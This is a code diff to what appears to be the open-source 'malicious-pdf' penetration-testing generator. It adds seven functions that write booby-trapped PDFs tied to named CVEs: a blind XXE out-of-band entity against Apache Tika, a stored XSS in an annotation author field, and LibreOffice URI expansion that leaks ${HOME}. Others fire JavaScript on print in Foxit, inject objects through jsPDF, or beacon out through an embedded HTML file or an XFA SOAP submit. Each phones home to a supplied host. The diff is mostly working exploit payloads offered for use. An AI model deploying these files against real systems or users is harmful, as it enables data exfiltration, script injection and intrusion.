@@ -205,7 +205,7 @@ def obfuscate_pdf(filepath, level):
         keywords = [
             b'/JavaScript', b'/OpenAction', b'/Launch', b'/SubmitForm',
             b'/GoToR', b'/GoToE', b'/ImportData', b'/Thread',
-            b'/RichMedia', b'/EmbeddedFile', b'/XFA',
+            b'/RichMedia', b'/EmbeddedFile', b'/XFA', b'/OCProperties',
         ]
         for kw in keywords:
             if kw in data:
@@ -3449,6 +3449,543 @@ startxref
 ''')
 
 
+# CVE-2025-66516: Blind XXE via OOB parameter entity in XFA (Apache Tika)
+# Apache Tika 1.13–3.2.1 fails to disable external entity resolution when
+# parsing XFA content in PDFs. Unlike test37 (general entity &xxe;), this uses
+# parameter entity %xxe; which triggers an HTTP fetch during DTD processing
+# itself — bypassing parsers that disable general entity expansion.
+# Targets: Confluence, Jira, Bamboo, Bitbucket, Elasticsearch (all use Tika).
+# Fixed in tika-core 3.2.2.
+def create_malpdf42(filename, host):
+    xfa_payload = (
+        '<?xml version="1.0" encoding="UTF-8"?>\n'
+        '<!DOCTYPE foo [\n'
+        '  <!ENTITY % xxe SYSTEM "' + host + '/test42-xxe-oob">\n'
+        '  %xxe;\n'
+        ']>\n'
+        '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n'
+        '  <template xmlns="http://www.xfa.org/schema/xfa-template/3.0/">\n'
+        '    <subform name="form1">\n'
+        '      <field name="f1"><value><text>oob</text></value></field>\n'
+        '    </subform>\n'
+        '  </template>\n'
+        '</xdp:xdp>'
+    )
+    xfa_len = len(xfa_payload)
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /AcroForm << /XFA 5 0 R >>
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'xxe-oob-xfa') Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Length ''' + str(xfa_len) + ''' >>
+stream
+''' + xfa_payload + '''
+endstream
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000100 00000 n
+0000000201 00000 n
+0000000470 00000 n
+0000000590 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+1100
+%%EOF
+''')
+
+
+# CVE-2025-70401: Stored DOM XSS via annotation /T (author) field
+# Apryse WebViewer passes the /T field of Text annotations through
+# innerHTML without sanitization during React re-renders. A malicious
+# author string containing HTML triggers persistent XSS in the viewer.
+# Targets: Apryse WebViewer, web-based PDF viewers that render annotation
+# metadata as HTML.
+def create_malpdf43(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [5 0 R]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'annot-xss'  ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Annot
+     /Subtype /Text
+     /Rect [100 700 300 750]
+     /T (<img src="''' + host + '''/test43-annot-xss">)
+     /Contents (Test annotation)
+     /Open true
+     /C [1 1 0]
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000069 00000 n
+0000000170 00000 n
+0000000530 00000 n
+0000000650 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+950
+%%EOF
+''')
+
+
+# CVE-2024-12426: LibreOffice vnd.sun.star.expand URL variable exfiltration
+# LibreOffice < 24.8.4 processes the vnd.sun.star.expand: URI scheme which
+# expands environment variables and INI file values. A /URI action using
+# this scheme causes LibreOffice to fetch a URL containing the expanded
+# values of ${HOME}, AWS credentials from .env files, etc.
+# No user interaction required — fires on document open.
+# Targets: headless LibreOffice server-side conversion pipelines.
+def create_malpdf44(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /OpenAction 5 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'lo-expand'  ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /URI
+     /URI (vnd.sun.star.expand:''' + host + '''/test44-lo-expand?v=${HOME})
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000082 00000 n
+0000000183 00000 n
+0000000452 00000 n
+0000000572 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+750
+%%EOF
+''')
+
+
+# CVE-2025-59803: Foxit OCG JavaScript trigger during signing workflow
+# Foxit Reader/Editor < 2025.2.1 fires /AA /WP (Will Print) and /DP
+# (Did Print) triggers during the internal flatten-and-print step of
+# digital signing. JavaScript actions in these triggers execute during
+# the signing workflow, enabling callbacks without explicit user action.
+# Combined with OCG (Optional Content Groups) for content manipulation.
+def create_malpdf45(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /OCProperties <<
+       /OCGs [5 0 R]
+       /D << /ON [5 0 R] /OFF [] /BaseState /ON >>
+     >>
+     /AA <<
+       /WP 6 0 R
+       /DP 6 0 R
+     >>
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'ocg-trigger') Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /OCG
+     /Name (Layer1)
+     /Intent /View
+  >>
+endobj
+
+6 0 obj
+  << /Type /Action
+     /S /JavaScript
+     /JS (app.launchURL("''' + host + '''/test45-ocg-trigger", true))
+  >>
+endobj
+
+xref
+0 7
+0000000000 65535 f
+0000000010 00000 n
+0000000230 00000 n
+0000000331 00000 n
+0000000600 00000 n
+0000000720 00000 n
+0000000800 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 7
+  >>
+startxref
+950
+%%EOF
+''')
+
+
+# CVE-2026-25755: jsPDF addJS() PDF object injection
+# jsPDF < 4.2.0 fails to escape ) in addJS() input, allowing attackers
+# to terminate the JS literal string and inject arbitrary PDF objects.
+# This test demonstrates the resulting PDF structure: a truncated JS
+# object (remnant of broken string) followed by an attacker-injected
+# page object with /AA /O (Open) auto-action containing a URI callback.
+# Different from test28 (duplicate /A key) — this is object-level injection.
+def create_malpdf46(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /OpenAction 3 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [4 0 R]
+     /Count 1
+  >>
+endobj
+
+3 0 obj
+  << /S /JavaScript
+     /JS (var x=1)
+  >>
+endobj
+
+4 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /MediaBox [0 0 612 792]
+     /AA << /O << /S /URI /URI (''' + host + '''/test46-obj-inject) >> >>
+  >>
+endobj
+
+trailer
+  << /Root 1 0 R
+     /Size 5
+  >>
+%%EOF
+''')
+
+
+# PDF 2.0: Embedded HTML callback via /AF (Associated Files)
+# PDF 2.0 introduced the /AF (Associated Files) array in the catalog,
+# allowing files to be attached at document level with semantic roles.
+# This embeds an HTML file via /EF (EmbeddedFile) referenced from /AF,
+# with an Image() beacon callback. Different from test39 (RichMedia
+# annotation, Acrobat-specific pre-2.0) — /AF is a PDF 2.0 spec feature
+# that may be processed by different viewers and server-side tools.
+def create_malpdf47(filename, host):
+    html_payload = '<html><body><script>\nvar i=new Image(1,1);i.src="' + host + '/test47-af-embed";\n</script></body></html>'
+    html_len = len(html_payload)
+    with open(filename, "w") as file:
+        file.write('''%PDF-2.0
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /AF [5 0 R]
+     /Version /2.0
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'af-embed'   ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Filespec
+     /F (test47.html)
+     /UF (test47.html)
+     /EF << /F 6 0 R >>
+     /AFRelationship /Supplement
+  >>
+endobj
+
+6 0 obj
+  << /Type /EmbeddedFile
+     /Subtype /text#2Fhtml
+     /Length ''' + str(html_len) + '''
+  >>
+stream
+''' + html_payload + '''
+endstream
+endobj
+
+xref
+0 7
+0000000000 65535 f
+0000000010 00000 n
+0000000098 00000 n
+0000000199 00000 n
+0000000468 00000 n
+0000000588 00000 n
+0000000730 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 7
+  >>
+startxref
+1050
+%%EOF
+''')
+
+
+# XFA SOAP callback via initialize event
+# XFA forms support <submit method="soap"> which sends SOAP-formatted
+# HTTP requests with Content-Type: text/xml and a SOAPAction header.
+# Using activity="initialize" fires earlier than test2's docReady event —
+# during XFA field object creation, before the document is fully ready.
+# Different from test2: SOAP method (not POST), initialize event (not
+# docReady), and includes SOAPAction header for distinct HTTP fingerprint.
+# Targets: Adobe Acrobat XFA engine, AEM Forms, server-side XFA processors.
+def create_malpdf48(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1
+1 0 obj <<>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<config><present><pdf>
+    <interactive>1</interactive>
+</pdf></present></config>
+<template>
+    <subform name="_">
+        <pageSet/>
+        <field id="SOAP Callback">
+            <event activity="initialize">
+               <submit
+                     method="soap"
+                     action="''' + host + '''/test48-xfa-soap"
+                     soapAction="http://soap.action/ping"/>
+            </event>
+        </field>
+    </subform>
+</template>
+</xdp:xdp>
+endstream
+endobj
+trailer <<
+    /Root <<
+        /AcroForm <<
+            /Fields [<<
+                /T (0)
+                /Kids [<<
+                    /Subtype /Widget
+                    /Rect []
+                    /T ()
+                    /FT /Btn
+                >>]
+            >>]
+            /XFA 1 0 R
+        >>
+        /Pages <<>>
+    >>
+>>''')
+
+
 _PDF_COMMENT = b'% Generated by malicious-pdf - https://github.com/jonaslejon/malicious-pdf\n'
 _PDF_INFO = b' /Info << /Creator (malicious-pdf) /Producer (https://github.com/jonaslejon/malicious-pdf) >>'
 
@@ -3485,7 +4022,7 @@ def _inject_credit(output_dir, file_extensions):
 def main():
     """Main function to generate malicious PDFs."""
     parser = argparse.ArgumentParser(
-        description="Generate 60 malicious PDF files with phone-home functionality for penetration testing. "
+        description="Generate 67 malicious PDF files with phone-home functionality for penetration testing. "
                     "Covers URI actions, JavaScript execution, form submission, annotation injection, "
                     "widget-based XSS, content extraction, XXE, CSP bypass, and more. "
                     "Use with Burp Collaborator or Interact.sh to detect callbacks."
@@ -3569,6 +4106,13 @@ def main():
         39: (create_malpdf39, ensure_scheme(host)),
         40: (create_malpdf40, ensure_scheme(host)),
         41: (create_malpdf41, ensure_scheme(host)),
+        42: (create_malpdf42, ensure_scheme(host)),
+        43: (create_malpdf43, ensure_scheme(host)),
+        44: (create_malpdf44, ensure_scheme(host)),
+        45: (create_malpdf45, ensure_scheme(host)),
+        46: (create_malpdf46, ensure_scheme(host)),
+        47: (create_malpdf47, ensure_scheme(host)),
+        48: (create_malpdf48, ensure_scheme(host)),
     }
 
     file_extensions = {14: '.svg'}
